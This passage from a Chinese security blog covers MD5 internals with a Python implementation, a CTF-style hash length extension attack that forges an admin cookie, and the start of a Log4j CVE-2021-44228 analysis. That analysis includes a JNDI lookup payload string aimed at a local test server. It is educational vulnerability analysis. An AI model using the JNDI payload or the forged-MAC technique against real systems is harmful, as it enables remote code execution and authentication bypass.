class="string">b&quot;\x00&quot;</span> * (remainder - distance - <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>剩下的<strong>64</strong>位是记录原文的真实长度的，因为<strong>MD5</strong>处理的是长度小于<strong>2^64</strong>位的数据。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 计算消息长度</span></span><br><span class="line">length = struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="built_in">len</span>(message) * <span class="number">8</span>)</span><br><span class="line">message += length</span><br></pre></td></tr></table></figure>
<h4 id="变量初始化">变量初始化</h4>
<p>用<strong>4</strong>个<strong>32</strong>位的寄存器<strong>A</strong>，<strong>B</strong>，<strong>C</strong>，<strong>D</strong>存放<strong>4</strong>个固定的<strong>32</strong>位整型参数【<strong>0123456789abcdeffedcba9876543210</strong>，用于第一轮迭代，注意是小端序。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">A, B, C, D = <span class="number">0x67452301</span>, <span class="number">0xefcdab89</span>, <span class="number">0x98badcfe</span>, <span class="number">0x10325476</span></span><br></pre></td></tr></table></figure>
<h4 id="分组处理">分组处理</h4>
<figure>
<img src="/images/Study-MD5/image-20200606101941933.png"
alt="image-20200606101941933" />
<figcaption aria-hidden="true">image-20200606101941933</figcaption>
</figure>
<p>在根据原文长度按<strong>512</strong>位一组分组后，每一组再按<strong>32</strong>位一组分<strong>16</strong>组，然后以<strong>16</strong>个子分组为一轮，依次经过函数计算后，再同上一步定义的<strong>ABCD</strong>四个初始变量计算生成新的<strong>ABCD</strong>变量，用于下一次计算。</p>
<p>这是<strong>MD5</strong>官方使用的四个函数，在<strong>512</strong>位分组的<strong>32</strong>位子分组中运算的时候，第一轮使用<strong>F</strong>函数，第二轮使用<strong>G</strong>函数，第三轮次使用<strong>H</strong>函数，在第四轮次使用<strong>I</strong>函数，每次都只用到<strong>BCD</strong>三个变量。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">F(B, C, D) = (B &amp; C) | ((~B) &amp; D)</span><br><span class="line">G(B, C, D) = (B &amp; D) | (C &amp; (~D))</span><br><span class="line">H(B, C, D) = B ^ C ^ D</span><br><span class="line">I(B, C, D) = C ^ (B | (~D))</span><br></pre></td></tr></table></figure>
<p>调用函数之后，田字格是相加，<strong>Mi</strong>是<strong>32</strong>位分组的原文，<strong>Ki</strong>是伪随机数生成的常数，把它们相加，和<strong>0xffffffff</strong>做与运算是为保证结果不超过<strong>32</strong>位。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 伪随机数k</span></span><br><span class="line">k = [<span class="built_in">int</span>(math.floor(<span class="built_in">abs</span>(math.sin(i + <span class="number">1</span>)) * (<span class="number">2</span> ** <span class="number">32</span>))) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line">……</span><br><span class="line"><span class="comment"># 分成16个组，I代表1组32位</span></span><br><span class="line">m = <span class="built_in">list</span>(struct.unpack(<span class="string">&#x27;&lt;&#x27;</span> + <span class="string">&#x27;I&#x27;</span> * <span class="number">16</span>, chunk))</span><br><span class="line">a, b, c, d = A, B, C, D</span><br><span class="line"><span class="comment"># 64轮运算，每一轮运算只用到了b, c, d三个</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">    <span class="keyword">if</span> i &lt; <span class="number">16</span>:</span><br><span class="line">        f = (b &amp; c) | ((~b) &amp; d)</span><br><span class="line">        <span class="comment"># 用于标识处于第几组信息</span></span><br><span class="line">        flag = i</span><br><span class="line">    <span class="keyword">elif</span> i &lt; <span class="number">32</span>:</span><br><span class="line">        f = (b &amp; d) | (c &amp; (~d))</span><br><span class="line">        flag = (<span class="number">5</span> * i + <span class="number">1</span>) % <span class="number">16</span></span><br><span class="line">    <span class="keyword">elif</span> i &lt; <span class="number">48</span>:</span><br><span class="line">        f = (b ^ c ^ d)</span><br><span class="line">        flag = (<span class="number">3</span> * i + <span class="number">5</span>) % <span class="number">16</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f = c ^ (b | (~d))</span><br><span class="line">        flag = (<span class="number">7</span> * i) % <span class="number">16</span></span><br><span class="line">        </span><br><span class="line">		res = (a + f + k[i] + m[flag]) &amp; <span class="number">0xffffffff</span></span><br></pre></td></tr></table></figure>
<p>然后将相加结果左移<strong>s</strong>【常量位，再加上<strong>B</strong>的值，同作与运算后赋值给<strong>B</strong>，同时，把<strong>D</strong>赋值给原<strong>A</strong>，<strong>B</strong>赋值给原<strong>C</strong>，<strong>C</strong>赋值给原<strong>D</strong>，如下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 左移</span></span><br><span class="line">lrot = <span class="keyword">lambda</span> x, n: (x &lt;&lt; n) | (x &gt;&gt; <span class="number">32</span> - n)</span><br><span class="line"><span class="comment"># 常量s</span></span><br><span class="line">s = [<span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>,</span><br><span class="line">     <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">4</span>,</span><br><span class="line">     <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>,</span><br><span class="line">     <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>]</span><br><span class="line">……</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">		tmp = b + lrot(res, s[i])</span><br><span class="line">  	a, b, c, d = d, tmp &amp; <span class="number">0xffffffff</span>, b, c</span><br></pre></td></tr></table></figure>
<p>最后拼接<strong>ABCD</strong>即可。</p>
<h4 id="完整代码">完整代码</h4>
<p>代码修改自<a
href="https://blog.csdn.net/u011377996/java/article/details/86365533"><strong>MD5</strong>原理及<strong>Python</strong>实现</a>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="comment"># 左移</span></span><br><span class="line">lrot = <span class="keyword">lambda</span> x, n: (x &lt;&lt; n) | (x &gt;&gt; <span class="number">32</span> - n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始向量</span></span><br><span class="line">A, B, C, D = <span class="number">0x67452301</span>, <span class="number">0xefcdab89</span>, <span class="number">0x98badcfe</span>, <span class="number">0x10325476</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 左移位数s</span></span><br><span class="line">s = [<span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>,</span><br><span class="line">     <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">4</span>,</span><br><span class="line">     <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>,</span><br><span class="line">     <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 伪随机数k</span></span><br><span class="line">k = [<span class="built_in">int</span>(math.floor(<span class="built_in">abs</span>(math.sin(i + <span class="number">1</span>)) * (<span class="number">2</span> ** <span class="number">32</span>))) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="keyword">global</span> A, B, C, D</span><br><span class="line">    <span class="comment"># 分组长度为512位，即64</span></span><br><span class="line">    group_length = <span class="number">64</span></span><br><span class="line">    <span class="comment"># 余数长度为448位，即56</span></span><br><span class="line">    remainder = <span class="number">56</span></span><br><span class="line">    distance = <span class="built_in">len</span>(message) % group_length</span><br><span class="line">    message = message.encode()</span><br><span class="line">    message += <span class="string">b&quot;\x80&quot;</span></span><br><span class="line">    <span class="keyword">if</span> distance &gt; remainder:</span><br><span class="line">        message += <span class="string">b&quot;\x00&quot;</span> * (group_length + remainder - distance - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        message += <span class="string">b&quot;\x00&quot;</span> * (remainder - distance - <span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 计算消息长度</span></span><br><span class="line">    length = struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="built_in">len</span>(message) * <span class="number">8</span>)</span><br><span class="line">    message += length</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(message) &gt; <span class="number">0</span>:</span><br><span class="line">        solve(message[:group_length])</span><br><span class="line">        message = message[group_length:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">chunk</span>):</span><br><span class="line">    <span class="keyword">global</span> A, B, C, D</span><br><span class="line">    <span class="comment"># 分成16个组，I代表1组32位</span></span><br><span class="line">    m = <span class="built_in">list</span>(struct.unpack(<span class="string">&#x27;&lt;&#x27;</span> + <span class="string">&#x27;I&#x27;</span> * <span class="number">16</span>, chunk))</span><br><span class="line">    a, b, c, d = A, B, C, D</span><br><span class="line">    <span class="comment"># 64轮运算，每一轮运算只用到了b, c, d三个</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        <span class="keyword">if</span> i &lt; <span class="number">16</span>:</span><br><span class="line">            f = (b &amp; c) | ((~b) &amp; d)</span><br><span class="line">            <span class="comment"># 用于标识处于第几组信息</span></span><br><span class="line">            flag = i</span><br><span class="line">        <span class="keyword">elif</span> i &lt; <span class="number">32</span>:</span><br><span class="line">            f = (b &amp; d) | (c &amp; (~d))</span><br><span class="line">            flag = (<span class="number">5</span> * i + <span class="number">1</span>) % <span class="number">16</span></span><br><span class="line">        <span class="keyword">elif</span> i &lt; <span class="number">48</span>:</span><br><span class="line">            f = (b ^ c ^ d)</span><br><span class="line">            flag = (<span class="number">3</span> * i + <span class="number">5</span>) % <span class="number">16</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f = c ^ (b | (~d))</span><br><span class="line">            flag = (<span class="number">7</span> * i) % <span class="number">16</span></span><br><span class="line">        res = (a + f + k[i] + m[flag]) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        tmp = b + lrot(res, s[i])</span><br><span class="line">        a, b, c, d = d, tmp &amp; <span class="number">0xffffffff</span>, b, c</span><br><span class="line">    A = (A + a) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    B = (B + b) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    C = (C + c) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    D = (D + d) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_digest</span>():</span><br><span class="line">    <span class="keyword">global</span> A, B, C, D</span><br><span class="line">    res = struct.pack(<span class="string">&#x27;&lt;IIII&#x27;</span>, A, B, C, D)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>.<span class="built_in">hex</span>(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">message = <span class="built_in">input</span>()</span><br><span class="line">initialize(message)</span><br><span class="line"><span class="built_in">print</span>(hex_digest())</span><br></pre></td></tr></table></figure>
<h3 id="哈希拓展攻击">哈希拓展攻击</h3>
<p>例题。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;</span>;</span><br><span class="line"><span class="variable">$secret</span> = <span class="string">&quot;XXXXXXXXXXXXXXX&quot;</span>; <span class="comment">// This secret is 15 characters long for security!</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;getmein&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">urldecode</span>(<span class="variable">$username</span>) === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="title function_ invoke__">urldecode</span>(<span class="variable">$password</span>) != <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;getmein&quot;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span> . <span class="title function_ invoke__">urldecode</span>(<span class="variable">$username</span> . <span class="variable">$password</span>))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Congratulations! You are a registered user.\n&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;The flag is &quot;</span> . <span class="variable">$flag</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;You are not an admin! LEAVE.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;sample-hash&quot;</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span> . <span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;admin&quot;</span> . <span class="string">&quot;admin&quot;</span>)), <span class="title function_ invoke__">time</span>() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;source&quot;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;source&quot;</span>, <span class="number">0</span>, <span class="title function_ invoke__">time</span>() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;source&quot;</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>; <span class="comment">// This source code is outputted here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>已知<strong>secret</strong>长度，已知<strong>md5($secret .
urldecode("admin" . "admin"))</strong>的值。</p>
<p>那么根据<strong>MD5</strong>的原理可知，实际加密数据如下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = secret + <span class="string">&quot;adminadmin&quot;</span></span><br><span class="line">res = message + <span class="string">&quot;\x80&quot;</span> + <span class="string">&quot;\x00&quot;</span> * (<span class="number">56</span> - <span class="built_in">len</span>(message) % <span class="number">64</span> - <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>而<strong>MD5</strong>是根据消息长度分组加密的，上一组计算的输出作为下一组的输入，那么在这里只需要将已知<strong>md5($secret
. urldecode("admin" .
"admin"))</strong>的值作为初始化的<strong>ABCD</strong>输入，设加密消息为<strong>"south"</strong>，就可以不需要知道前面<strong>secret</strong>的值得到如下加密数据。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 接上文代码</span></span><br><span class="line">south = <span class="string">&quot;south&quot;</span></span><br><span class="line">res = res + south + <span class="string">&quot;\x80&quot;</span> + <span class="string">&quot;\x00&quot;</span> * (<span class="number">56</span> - <span class="built_in">len</span>(south) % <span class="number">64</span> - <span class="number">1</span>)</span><br><span class="line"><span class="comment"># 实际加密的值为 secret + &quot;adminadmin&quot; + &quot;\x80&quot; + &quot;\x00&quot; * (56 - len(message) % 64 - 1) + &quot;south&quot;</span></span><br></pre></td></tr></table></figure>
<p>后面的<strong><span
class="math inline">\(username**和**\)</span>password</strong>可控，那么使得<strong><span
class="math inline">\(username=admin**，**\)</span>password=admin00south</strong>即可。</p>
<p>此时，满足例题的绕过。</p>
<h3 id="refer">Refer</h3>
<p><a
href="https://juejin.im/entry/59cf56a26fb9a00a4a4ceb64">漫画：什么是<strong>MD5</strong>算法？</a></p>
<p><a
href="https://blog.csdn.net/u011377996/java/article/details/86365533"><strong>MD5</strong>原理及<strong>Python</strong>实现</a></p>
<p><a
href="https://www.cnblogs.com/pcat/p/5478509.html">哈希长度扩展攻击的简介以及<strong>HashPump</strong>安装使用方法</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>MD5</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2021-44228 Log4j RCE 浅析</title>
    <url>/Study-RCE-Log4j/</url>
    <content><![CDATA[<p><strong>Log4j2</strong> 的 <strong>Lookups</strong>
是一项功能强大的功能，用于在日志记录过程中动态获取和替换属性值。</p>
<p>通过
<strong>Lookups</strong>，可以引用环境变量、系统属性、配置文件中定义的属性等，以在日志消息中动态插入相关的值。</p>
<span id="more"></span>
<h1 id="前沿">前沿</h1>
<p><strong><a
href="https://logging.apache.org/log4j/2.x/manual/lookups.html">Lookups</a></strong>
使用 <strong>${}</strong> 语法来引用属性，<strong>${}</strong>
中的内容可以是环境变量、系统属性、配置文件中的属性或其他支持的查找类型。</p>
<p>例如，<strong>${env:USER}</strong> 引用环境变量 USER
的值，<strong>${java:version}</strong> 引用 <strong>Java</strong>
运行时的版本。</p>
<p>除了配置文件，<strong>Log4j2</strong>
还允许在任何地方使用约定格式来获取环境中的指定配置信息。这个设定是导致漏洞的原因之一。</p>
<p>在 <strong>Lookups</strong> 中，可以使用如下配置帮助开发。</p>
<ul>
<li><a
href="https://logging.apache.org/log4j/2.x/manual/lookups.html#ContextMapLookup">Context
Map</a></li>
<li><a
href="https://logging.apache.org/log4j/2.x/manual/lookups.html#DateLookup">Date</a></li>
<li><a
href="https://logging.apache.org/log4j/2.x/manual/lookups.html#DockerLookup">Docker</a></li>
<li><a
href="https://logging.apache.org/log4j/2.x/manual/lookups.html#EnvironmentLookup">Environment</a></li>
<li><a
href="https://logging.apache.org/log4j/2.x/manual/lookups.html#EventLookup">Event</a></li>
<li><a
href="https://logging.apache.org/log4j/2.x/manual/lookups.html#JavaLookup">Java</a></li>
<li><a
href="https://logging.apache.org/log4j/2.x/manual/lookups.html#JndiLookup">JNDI</a></li>
<li><a
href="https://logging.apache.org/log4j/2.x/manual/lookups.html#JmxRuntimeInputArgumentsLookup">JVM
Arguments</a></li>
<li><a
href="https://logging.apache.org/log4j/2.x/manual/lookups.html#KubernetesLookup">Kubernetes</a></li>
<li><a
href="https://logging.apache.org/log4j/2.x/manual/lookups.html#Log4jConfigLookup">Log4j
Config</a></li>
<li><a
href="https://logging.apache.org/log4j/2.x/manual/lookups.html#LowerLookup">Lower</a></li>
<li><a
href="https://logging.apache.org/log4j/2.x/manual/lookups.html#AppMainArgsLookup">Main
Arguments</a></li>
<li><a
href="https://logging.apache.org/log4j/2.x/manual/lookups.html#MapLookup">Map</a></li>
<li><a
href="https://logging.apache.org/log4j/2.x/manual/lookups.html#SpringLookup">Spring</a></li>
<li><a
href="https://logging.apache.org/log4j/2.x/manual/lookups.html#StructuredDataLookup">Structured
Data</a></li>
<li><a
href="https://logging.apache.org/log4j/2.x/manual/lookups.html#SystemPropertiesLookup">System
Properties</a></li>
<li><a
href="https://logging.apache.org/log4j/2.x/manual/lookups.html#UpperLookup">Upper</a></li>
<li><a
href="https://logging.apache.org/log4j/2.x/manual/lookups.html#WebLookup">Web</a></li>
</ul>
<p>其中最为关键的则是 <a
href="https://logging.apache.org/log4j/2.x/manual/lookups.html#JndiLookup"><strong>JNDI</strong></a>，是漏洞的直接导火索。</p>
<h1 id="漏洞简介">漏洞简介</h1>
<p>漏洞适用版本为 <strong>2.0 &lt;= Apache Log4j2 &lt;=
2.14.1</strong>，只需引入 <strong>log4j-api、log4j-core</strong> 两个
<strong>JAR</strong>。</p>
<p>入口函数为
<strong>logIfEnabled</strong>，<strong>debug、info、warn、error、fatal</strong>
等均会触发。</p>
<h1 id="漏洞分析">漏洞分析</h1>
<h2 id="配置">配置</h2>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.13.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.13.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">log4jRCE</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(log4jRCE.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:14514/test&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="调用链">调用链</h2>
<h3
id="messagepatternconverterformat">MessagePatternConverter#format</h3>
<p>快进到
<strong>MessagePatternConverter#format</strong>，该方法对日志内容进行解析和格式化，并返回最终格式化的内容，第
<strong>16</strong> 行判断包含 ${ 的字符的时候，进入 <strong>if</strong>
判断，然后在 <strong>19</strong> 行进入 <strong>replace</strong>
方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// MessagePatternConverter (org.apache.logging.log4j.core.pattern)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder toAppendTo)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> event.getMessage();</span><br><span class="line">    <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> StringBuilderFormattable) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">doRender</span> <span class="operator">=</span> textRenderer != <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">StringBuilder</span> <span class="variable">workingBuilder</span> <span class="operator">=</span> doRender ? <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="number">80</span>) : toAppendTo;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">StringBuilderFormattable</span> <span class="variable">stringBuilderFormattable</span> <span class="operator">=</span> (StringBuilderFormattable) msg;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">offset</span> <span class="operator">=</span> workingBuilder.length();</span><br><span class="line">        stringBuilderFormattable.formatTo(workingBuilder);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO can we optimize this?</span></span><br><span class="line">        <span class="keyword">if</span> (config != <span class="literal">null</span> &amp;&amp; !noLookups) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> offset; i &lt; workingBuilder.length() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (workingBuilder.charAt(i) == <span class="string">&#x27;$&#x27;</span> &amp;&amp; workingBuilder.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> workingBuilder.substring(offset, workingBuilder.length());</span><br><span class="line">                    workingBuilder.setLength(offset);</span><br><span class="line">                    workingBuilder.append(config.getStrSubstitutor().replace(event, value));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (doRender) &#123;</span><br><span class="line">            textRenderer.render(workingBuilder, toAppendTo);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="strsubstitutorreplace">StrSubstitutor#replace</h3>
<p><strong>StrSubstitutor#replace</strong> 在第 <strong>7</strong>
行调用了 <strong>substitute</strong> 方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// StrSubstitutor (org.apache.logging.log4j.core.lookup)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">replace</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String source)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (source == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">StringBuilder</span> <span class="variable">buf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(source);</span><br><span class="line">    <span class="keyword">if</span> (!substitute(event, buf, <span class="number">0</span>, source.length())) &#123;</span><br><span class="line">        <span class="keyword">return</span> source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> buf.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="strsubstitutorsubstitute">StrSubstitutor#substitute</h3>
<p><strong>StrSubstitutor#substitute</strong> 中分别定义了
<strong>prefixMatcher、suffixMatcher</strong> 和
<strong>valueDelimiterMatcher</strong>。</p>
<p>第 <strong>17</strong> 行 <strong>startMatchLen</strong> 使用
<strong>prefixMatcher</strong> 匹配到 <strong>${</strong>。</p>
